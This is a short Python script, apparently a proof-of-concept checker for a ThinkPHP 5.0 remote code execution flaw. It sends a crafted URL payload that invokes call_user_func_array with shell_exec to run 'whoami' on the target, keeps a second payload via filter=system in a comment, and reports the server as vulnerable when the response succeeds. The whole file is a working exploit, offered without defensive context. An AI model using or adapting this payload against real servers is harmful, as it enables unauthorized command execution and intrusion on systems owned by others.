#!/usr/bin/env python
# coding: utf-8
# Date  : 2019-01-18 11:52:51
# Email : b4zinga@outlook.com
# Func  :

import requests

def run(url):
    """Thinkphp 5.0 remote code exec"""
    # vul = ":8080/index.php?s=/Index/\\think\\Request/input&filter=system&data=whoami"
    vul = ":8080/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=whoami"
    req = requests.get(url + vul)
    if req.status_code == 200:
        return "Thinkphp 5.0 RCE Vulnerable\t\twhoami: " + req.text
    else:
        return False



if __name__ == '__main__':
    print(run("http://192.168.253.133:8080"))
